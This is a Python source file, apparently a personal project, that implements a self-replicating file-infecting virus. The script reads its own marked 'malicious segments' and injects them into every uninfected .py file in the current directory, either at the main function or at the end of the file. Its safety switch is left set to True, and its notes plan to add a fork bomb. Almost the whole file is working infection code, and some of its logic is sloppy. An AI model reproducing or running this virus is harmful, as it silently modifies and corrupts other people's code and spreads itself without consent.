'''
--------------------------------------------------------------------------------
Date Created:   11/07/2024
Date Modified:  11/23/2024
Version:        3.0
Author:         Lino Mercado-Esquivias (lino.a.mercado@gmail.com)

Description:    Self Replicating Virus
                A virus that infects other python scripts. It takes malicious
                and injects it at the beginning of the main function of each

Future Work:    1) Add malicious functionality (i.e. fork bomb)
--------------------------------------------------------------------------------
'''

# SAFETY SWITCH
RUN_PROGRAM = True     # set to True to run the virus

def main():
    if not RUN_PROGRAM:
        exit(0)

    # prepare payload
    virus_payload = prepare_payload()
    # search for and infect potential hosts
    spread_infection(virus_payload)
    # malicious function

def prepare_payload():
    # MALICIOUS SEGMENT BEGIN
    import sys
    virus_directory = sys.argv[0]
    with open(virus_directory, "r") as virus_file:
        unpacked_virus_file = virus_file.readlines()
    malicious_segment = False
    virus_payload = []
    for line in unpacked_virus_file:
        if line.strip() == "# MALICIOUS SEGMENT BEGIN":
            malicious_segment = True
        if malicious_segment:
            virus_payload.append(line)
        if line.strip() == "# MALICIOUS SEGMENT END":
            malicious_segment = False
    # MALICIOUS SEGMENT END
    return virus_payload

def spread_infection(virus_payload):
    # MALICIOUS SEGMENT BEGIN
    import re
    from glob import glob
    import lino_colors as colors 

    main_function_pattern =  r"""
    ^\s*                        # Leading whitespace
    def\s+                      # Define keyword with trailing space
    main\s*                     # Main function with optional trailing space
    \(                          # Opening parenthesis
    \s*([^)]*)\s*               # Zero or more arguments inside the parentheses
    \)\s*                       # Closing parenthesis with a colon
    (->\s*[^:]+)?\s*:           # Optional return type with trailing colon
    """
    # Example Patterns:
    # def main():
    # def main(a, b, c):
    # def main(a: int, b: float) -> int:
    regex = re.compile(main_function_pattern, re.VERBOSE)

    # search for potential hosts
    potential_hosts = glob("*.py")
    for vector in potential_hosts:
        with open(vector, "r") as vector_file:
            unpacked_vector_file = vector_file.readlines()

        # check if vector is infected
        vector_infected = False
        main_definition = -1
        for line_number,line in enumerate(unpacked_vector_file, start=1):
            if line.strip() == "# MALICIOUS SEGMENT BEGIN":
                vector_infected = True
                break
            elif (match := regex.match(line)):
                main_definition = line_number

        # inject payload
        if not vector_infected and main_definition != -1:
            infected_code = []
            modified_payload = ["    " + line for line in virus_payload]
            infected_code = unpacked_vector_file
            infected_code[main_definition:main_definition] = virus_payload
            with open(vector, "w") as vector_file:
                print(f"File {vector} infected.")
                vector_file.writelines(infected_code)
        elif not vector_infected and main_definition == -1:
            infected_code = unpacked_vector_file + virus_payload
            with open(vector, "w") as vector_file:
                print(f"File {vector} infected.")
                vector_file.writelines(infected_code)
        else:
            print(f"File {vector} has already been infected.")
    # MALICIOUS SEGMENT END

if __name__ == "__main__":
    main()